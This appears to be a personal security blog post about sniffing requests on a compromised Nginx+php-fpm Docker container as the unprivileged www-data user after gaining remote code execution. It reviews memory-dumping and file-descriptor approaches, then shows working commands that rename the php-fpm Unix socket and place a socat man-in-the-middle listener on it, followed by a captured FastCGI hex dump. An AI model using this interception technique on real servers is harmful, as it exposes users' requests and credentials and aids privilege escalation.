<!DOCTYPE html>
<html>
<style>

		@font-face { font-family: "gohu"; src: url("/gohu.woff") format('woff'); }
		body {
			font-family: 'gohu', monospace;
			max-width: 50em;
			margin: 0 auto;
			color: white;
			background: black;
			line-height: calc(1ex / 0.32);
			margin-top: 3em;
		}
		pre {
			font-family: 'gohu', monospace;
			white-space: pre-wrap;
			line-height: 125%;
      background-color: #111;
      padding: 1em;
		}
		@media only screen and (max-width:768px) {
			body {
				max-width:100%;
			}
		}
		a:link {
			color: #0a0 ;
		}
		a:visited {
			color: #004100 ;
		}
		td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		.codehilite .hll { background-color: #0000ff }
		.codehilite { background: #000000; }
		.codehilite .c { color: #00ff00 } /* Comment */
		.codehilite .k { color: #ff0000 } /* Keyword */
		.codehilite .ch { color: #00ff00 } /* Comment.Hashbang */
		.codehilite .cm { color: #00ff00 } /* Comment.Multiline */
		.codehilite .cp { color: #e5e5e5 } /* Comment.Preproc */
		.codehilite .cpf { color: #00ff00 } /* Comment.PreprocFile */
		.codehilite .c1 { color: #00ff00 } /* Comment.Single */
		.codehilite .cs { color: #00ff00 } /* Comment.Special */
		.codehilite .kc { color: #ff0000 } /* Keyword.Constant */
		.codehilite .kd { color: #ff0000 } /* Keyword.Declaration */
		.codehilite .kn { color: #ff0000 } /* Keyword.Namespace */
		.codehilite .kp { color: #ff0000 } /* Keyword.Pseudo */
		.codehilite .kr { color: #ff0000 } /* Keyword.Reserved */
		.codehilite .kt { color: #ee82ee } /* Keyword.Type */
		.codehilite .s { color: #87ceeb } /* Literal.String */
		.codehilite .no { color: #7fffd4 } /* Name.Constant */
		.codehilite .nf { color: #ffff00 } /* Name.Function */
		.codehilite .nv { color: #eedd82 } /* Name.Variable */
		.codehilite .sa { color: #87ceeb } /* Literal.String.Affix */
		.codehilite .sb { color: #87ceeb } /* Literal.String.Backtick */
		.codehilite .sc { color: #87ceeb } /* Literal.String.Char */
		.codehilite .dl { color: #87ceeb } /* Literal.String.Delimiter */
		.codehilite .sd { color: #87ceeb } /* Literal.String.Doc */
		.codehilite .s2 { color: #87ceeb } /* Literal.String.Double */
		.codehilite .se { color: #87ceeb } /* Literal.String.Escape */
		.codehilite .sh { color: #87ceeb } /* Literal.String.Heredoc */
		.codehilite .si { color: #87ceeb } /* Literal.String.Interpol */
		.codehilite .sx { color: #87ceeb } /* Literal.String.Other */
		.codehilite .sr { color: #87ceeb } /* Literal.String.Regex */
		.codehilite .s1 { color: #87ceeb } /* Literal.String.Single */
		.codehilite .ss { color: #87ceeb } /* Literal.String.Symbol */
		.codehilite .fm { color: #ffff00 } /* Name.Function.Magic */
		.codehilite .vc { color: #eedd82 } /* Name.Variable.Class */
		.codehilite .vg { color: #eedd82 } /* Name.Variable.Global */
		.codehilite .vi { color: #eedd82 } /* Name.Variable.Instance */
		.codehilite .vm { color: #eedd82 } /* Name.Variable.Magic */
	
</style>
<head>
  <meta charset="UTF-8">
</head>

<body><h1>Rootless Sniffing</h1>
<p>1617736356</p>
<p>Once upon a time, a noob found an RCE on a server but didn't got root, the noob wanted to sniff the requests that were arriving on that server, to escalate privileges, but didn't know how. That noob is me , and this is my story.</p>
<h1>Scenario</h1>
<p>Okay, ignore the bullshit intro.
I had access to the <code>www-data</code> user, and the server was running <code>Nginx+php-fpm</code>, how could I sniff the requests without rooting it to run <code>tcpdump</code>? The <code>Nginx</code> and <code>php-fpm</code> master processes run as <code>root</code>, but the workers run on <code>www-data</code>. Oh, and it was a docker alpine instance, fack.</p>
<h1>Ideias</h1>
<h2>Dumping the memory</h2>
<p>The first idea that came to mind was to just dump the memory of the <code>Nginx/php-fpm</code> workers via the <code>/proc/PID/mem</code> and hope that the requests are there. Here is a nice thread about it <a href="https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux">unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux</a> got most of the info there.</p>
<p>The problem that I ran into was that most tools/scripts uses the <code>ptrace</code> syscall to attach  to the process before dumping it, and you can't <code>ptrace</code> at all on Docker on kernels older than 4.8 without a specific config <code>--cap-add=SYS_PTRACE</code> or on <code>docker-compose.yml</code> :</p>
<div class="codehilite"><pre><span></span><code>cap_add:
    - SYS_PTRACE
</code></pre></div>


<p>A deeper analysis of this on <a href="https://jvns.ca/blog/2020/04/29/why-strace-doesnt-work-in-docker/">jvns.ca/blog/2020/04/29/why-strace-doesnt-work-in-docker/</a>.</p>
<p>On Docker running kernels after 4.8 you can use the <code>process_vm_readv</code> syscall to dump the memory without attaching to it, but you still can't dump the memory of any process under your user. If the <code>/proc/sys/kernel/yama/ptrace_scope</code> is set to <code>1</code> it will only allow <code>ptrace</code>/<code>process_vm_readv</code> if your proccess is the father of the process you want to <code>ptrace</code>, if it's set to zero you can dump the memory, but it's <code>1</code> by default on most systems. More info on <code>Yama</code> on general : <a href="https://www.kernel.org/doc/Documentation/security/Yama.txt">kernel.org/doc/Documentation/security/Yama.txt</a></p>
<p>Basically I can only dump the memory of a process  that I executed, not of any process running on my user. The workers are executed by the masters process that run under root :'( I also can't just spawn a new worker from <code>www-data</code> because the master process will ignore it.</p>
<h2>Logs</h2>
<p>Editing <code>Nginx</code> config to add some logs? No <code>root</code> , no way :(</p>
<h2>File Descriptors</h2>
<p>The idea here was that to each request the Nginx worker was going to open a new file descriptor to that socket, and I could dump his contents, if I'm quick, via <code>/proc/PID/fd/N</code>. It's a nice idea, but you can't interact with sockets/pipes by just using the file <code>/proc/PID/fd/N</code>.</p>
<p>There is one way that I found to achieve this: copying all the file descriptors using the fairly new syscall <code>pidfd_getfd</code>, this was introduced on kernel 5.6, with the <code>pidfd_open</code> syscall you can open a new file descriptor that refers to another process, with that you can use <code>pidfd_getfd</code> to copy all file descriptors and use them. Now for the sad part: <code>pidfd_getfd</code> permissions are governed by <code>ptrace</code> (T_T) So this falls in the same problem as dumping the memory.  </p>
<h2>Unix domain socket</h2>
<p>Reading through the config file of <code>php-fpm</code> I found out that it used a <a href="https://en.wikipedia.org/wiki/Unix_domain_socket">Unix domain socket</a> to communicate with Nginx using <a href="https://en.wikipedia.org/wiki/FastCGI">Fastcgi</a> , what a horrible name btw.</p>
<p><code>/usr/local/etc/php-fpm.d/www.conf</code></p>
<div class="codehilite"><pre><span></span><code><span class="k">[...]</span><span class="w"></span>
<span class="c1">; The address on which to accept FastCGI requests.</span><span class="w"></span>
<span class="c1">; Valid syntaxes are:</span><span class="w"></span>
<span class="c1">;   &#39;ip.add.re.ss:port&#39;    - to listen on a TCP socket to a specific IPv4 address on</span><span class="w"></span>
<span class="c1">;                            a specific port;</span><span class="w"></span>
<span class="c1">;   &#39;[ip:6:addr:ess]:port&#39; - to listen on a TCP socket to a specific IPv6 address on</span><span class="w"></span>
<span class="c1">;                            a specific port;</span><span class="w"></span>
<span class="c1">;   &#39;port&#39;                 - to listen on a TCP socket to all addresses</span><span class="w"></span>
<span class="c1">;                            (IPv6 and IPv4-mapped) on a specific port;</span><span class="w"></span>
<span class="c1">;   &#39;/path/to/unix/socket&#39; - to listen on a unix socket.</span><span class="w"></span>
<span class="c1">; Note: This value is mandatory.</span><span class="w"></span>
<span class="na">listen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">/tmp/.php-fpm.sock</span><span class="w"></span>
<span class="k">[...]</span><span class="w"></span>
</code></pre></div>


<p>So I began to search for ways of sniffing the Unix domain socket, and turns out it's pretty hard to properly sniff it, mainly because it isn't bound to any protocol, and most reliable ways use <code>ptrace</code>, but a dirty hack it's to just rename the socket, everything's a file on unix yadayada, and create a new one that MiTM it , like this <a href="https://superuser.com/a/576404">superuser.com/a/576404</a>, using <code>socat</code>. Note that this only works if you can write on the socket's directory, I'm still not sure if this is the default when using a supervisor, or it's a misconfig putting the socket on <code>/tmp</code>, but surely it isn't that uncommon.
So here's the first attempt using <code>socat</code> :</p>
<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="nt">tmp</span><span class="w"> </span><span class="o">$</span><span class="w"> </span><span class="nt">id</span><span class="w"></span>
<span class="nt">uid</span><span class="o">=</span><span class="nt">82</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span><span class="w"> </span><span class="nt">gid</span><span class="o">=</span><span class="nt">82</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span><span class="w"> </span><span class="nt">groups</span><span class="o">=</span><span class="nt">82</span><span class="o">(</span><span class="nt">www-data</span><span class="o">),</span><span class="nt">82</span><span class="o">(</span><span class="nt">www-data</span><span class="o">)</span><span class="w"></span>
<span class="o">/</span><span class="nt">tmp</span><span class="w"> </span><span class="o">$</span><span class="w"> </span><span class="nt">mv</span><span class="w"> </span><span class="p">.</span><span class="nc">php-fpm</span><span class="p">.</span><span class="nc">sock</span><span class="w"> </span><span class="p">.</span><span class="nc">php-fpm</span><span class="p">.</span><span class="nc">sock</span><span class="p">.</span><span class="nc">1</span><span class="w"></span>
<span class="o">/</span><span class="nt">tmp</span><span class="w"> </span><span class="o">$</span><span class="w"> </span><span class="o">./</span><span class="nt">socat</span><span class="w"> </span><span class="nt">-t100</span><span class="w"> </span><span class="nt">-x</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nt">UNIX-LISTEN</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/</span><span class="p">.</span><span class="nc">php-fpm</span><span class="p">.</span><span class="nc">sock</span><span class="o">,</span><span class="nt">mode</span><span class="o">=</span><span class="nt">777</span><span class="o">,</span><span class="nt">reuseaddr</span><span class="o">,</span><span class="nt">fork</span><span class="w"> </span><span class="nt">UNIX-</span><span class="w"></span>
<span class="nt">CONNECT</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/</span><span class="p">.</span><span class="nc">php-fpm</span><span class="p">.</span><span class="nc">sock</span><span class="p">.</span><span class="nc">1</span><span class="w"></span>
<span class="o">&gt;</span><span class="w"> </span><span class="nt">2021</span><span class="o">/</span><span class="nt">03</span><span class="o">/</span><span class="nt">25</span><span class="w"> </span><span class="nt">08</span><span class="p">:</span><span class="nd">47</span><span class="p">:</span><span class="nd">56</span><span class="p">.</span><span class="nc">069495</span><span class="w">  </span><span class="nt">length</span><span class="o">=</span><span class="nt">816</span><span class="w"> </span><span class="nt">from</span><span class="o">=</span><span class="nt">0</span><span class="w"> </span><span class="nt">to</span><span class="o">=</span><span class="nt">815</span><span class="w"></span>
<span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">08</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">00</span><span class="w">  </span><span class="o">................</span><span class="w"></span>
<span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">04</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">01</span><span class="w"> </span><span class="nt">03</span><span class="w"> </span><span class="nt">06</span><span class="w"> </span><span class="nt">02</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">0f</span><span class="w"> </span><span class="nt">15</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">54</span><span class="w">  </span><span class="o">.........</span><span class="p">.</span><span class="nc">SCRIPT</span><span class="w"></span>
<span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">46</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">4c</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">4d</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">75</span><span class="w">  </span><span class="nt">_FILENAME</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">pu</span><span class="w"></span>
<span class="w"> </span><span class="nt">62</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">63</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">64</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">78</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">68</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">0c</span><span class="w"> </span><span class="nt">07</span><span class="w">  </span><span class="nt">blic</span><span class="o">/</span><span class="nt">index</span><span class="p">.</span><span class="nc">php</span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">51</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">59</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">47</span><span class="w"> </span><span class="nt">71</span><span class="w"> </span><span class="nt">3d</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">68</span><span class="w">  </span><span class="nt">QUERY_STRINGq</span><span class="o">=/</span><span class="nt">h</span><span class="w"></span>
<span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">79</span><span class="w"> </span><span class="nt">26</span><span class="w"> </span><span class="nt">0e</span><span class="w"> </span><span class="nt">03</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">51</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">4d</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">54</span><span class="w">  </span><span class="nt">ey</span><span class="o">&amp;.</span><span class="p">.</span><span class="nc">REQUEST_MET</span><span class="w"></span>
<span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">44</span><span class="w"> </span><span class="nt">47</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">0c</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">5f</span><span class="w">  </span><span class="nt">HODGET</span><span class="o">.</span><span class="p">.</span><span class="nc">CONTENT_</span><span class="w"></span>
<span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">59</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">0e</span><span class="w"> </span><span class="nt">00</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">4c</span><span class="w"> </span><span class="nt">45</span><span class="w">  </span><span class="nt">TYPE</span><span class="o">.</span><span class="p">.</span><span class="nc">CONTENT_LE</span><span class="w"></span>
<span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">47</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">0b</span><span class="w"> </span><span class="nt">0a</span><span class="w">                                </span><span class="nt">NGTH</span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">4d</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">64</span><span class="w"> </span><span class="nt">65</span><span class="w">  </span><span class="nt">SCRIPT_NAME</span><span class="o">/</span><span class="nt">inde</span><span class="w"></span>
<span class="w"> </span><span class="nt">78</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">68</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">0b</span><span class="w"> </span><span class="nt">04</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">51</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">55</span><span class="w">  </span><span class="nt">x</span><span class="p">.</span><span class="nc">php</span><span class="o">.</span><span class="p">.</span><span class="nc">REQUEST_U</span><span class="w"></span>
<span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">68</span><span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">79</span><span class="w"> </span><span class="nt">0c</span><span class="w"> </span><span class="nt">0a</span><span class="w">                          </span><span class="nt">RI</span><span class="o">/</span><span class="nt">hey</span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">44</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">4d</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">64</span><span class="w">  </span><span class="nt">DOCUMENT_URI</span><span class="o">/</span><span class="nt">ind</span><span class="w"></span>
<span class="w"> </span><span class="nt">65</span><span class="w"> </span><span class="nt">78</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">68</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">0d</span><span class="w"> </span><span class="nt">0b</span><span class="w"> </span><span class="nt">44</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">4d</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">54</span><span class="w">  </span><span class="nt">ex</span><span class="p">.</span><span class="nc">php</span><span class="o">.</span><span class="p">.</span><span class="nc">DOCUMENT</span><span class="w"></span>
<span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">61</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">75</span><span class="w"> </span><span class="nt">62</span><span class="w"> </span><span class="nt">6c</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">63</span><span class="w">  </span><span class="nt">_ROOT</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">public</span><span class="w"></span>
<span class="w"> </span><span class="nt">0f</span><span class="w"> </span><span class="nt">08</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">56</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">4f</span><span class="w">  </span><span class="o">.</span><span class="p">.</span><span class="nc">SERVER_PROTOCO</span><span class="w"></span>
<span class="w"> </span><span class="nt">4c</span><span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">0e</span><span class="w"> </span><span class="nt">04</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">51</span><span class="w"> </span><span class="nt">55</span><span class="w"> </span><span class="nt">45</span><span class="w">  </span><span class="nt">LHTTP</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span><span class="o">.</span><span class="p">.</span><span class="nc">REQUE</span><span class="w"></span>
<span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">48</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">4d</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">68</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">74</span><span class="w"> </span><span class="nt">70</span><span class="w"> </span><span class="nt">11</span><span class="w"> </span><span class="nt">07</span><span class="w"> </span><span class="nt">47</span><span class="w">  </span><span class="nt">ST_SCHEMEhttp</span><span class="o">.</span><span class="p">.</span><span class="nc">G</span><span class="w"></span>
<span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">57</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">59</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">4e</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">46</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">45</span><span class="w">  </span><span class="nt">ATEWAY_INTERFACE</span><span class="w"></span>
<span class="w"> </span><span class="nt">43</span><span class="w"> </span><span class="nt">47</span><span class="w"> </span><span class="nt">49</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">0f</span><span class="w"> </span><span class="nt">0c</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">56</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">5f</span><span class="w">  </span><span class="nt">CGI</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span><span class="o">.</span><span class="p">.</span><span class="nc">SERVER_</span><span class="w"></span>
<span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">46</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">57</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">67</span><span class="w"> </span><span class="nt">69</span><span class="w"> </span><span class="nt">6e</span><span class="w"> </span><span class="nt">78</span><span class="w"> </span><span class="nt">2f</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">2e</span><span class="w">  </span><span class="nt">SOFTWAREnginx</span><span class="o">/</span><span class="nt">1</span><span class="o">.</span><span class="w"></span>
<span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">38</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">0b</span><span class="w"> </span><span class="nt">0a</span><span class="w">                                </span><span class="nt">18</span><span class="p">.</span><span class="nc">0</span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">4d</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">44</span><span class="w"> </span><span class="nt">44</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">37</span><span class="w"> </span><span class="nt">32</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">31</span><span class="w">  </span><span class="nt">REMOTE_ADDR172</span><span class="p">.</span><span class="nc">1</span><span class="w"></span>
<span class="w"> </span><span class="nt">38</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">0b</span><span class="w"> </span><span class="nt">05</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">4d</span><span class="w"> </span><span class="nt">4f</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">4f</span><span class="w">  </span><span class="nt">8</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="o">.</span><span class="p">.</span><span class="nc">REMOTE_PO</span><span class="w"></span>
<span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">54</span><span class="w"> </span><span class="nt">35</span><span class="w"> </span><span class="nt">37</span><span class="w"> </span><span class="nt">35</span><span class="w"> </span><span class="nt">38</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">0b</span><span class="w"> </span><span class="nt">0a</span><span class="w">                       </span><span class="nt">RT57580</span><span class="o">..</span><span class="w"></span>
<span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">56</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">41</span><span class="w"> </span><span class="nt">44</span><span class="w"> </span><span class="nt">44</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">37</span><span class="w"> </span><span class="nt">32</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">31</span><span class="w">  </span><span class="nt">SERVER_ADDR172</span><span class="p">.</span><span class="nc">1</span><span class="w"></span>
<span class="w"> </span><span class="nt">38</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">30</span><span class="w"> </span><span class="nt">2e</span><span class="w"> </span><span class="nt">32</span><span class="w"> </span><span class="nt">0b</span><span class="w"> </span><span class="nt">02</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">56</span><span class="w"> </span><span class="nt">45</span><span class="w"> </span><span class="nt">52</span><span class="w"> </span><span class="nt">5f</span><span class="w"> </span><span class="nt">50</span><span class="w"> </span><span class="nt">4f</span><span class="w">  </span><span class="nt">8</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">2</span><span class="o">.</span><span class="p">.</span><span class="nc">SERVER_PO</span><span class="w"></span>
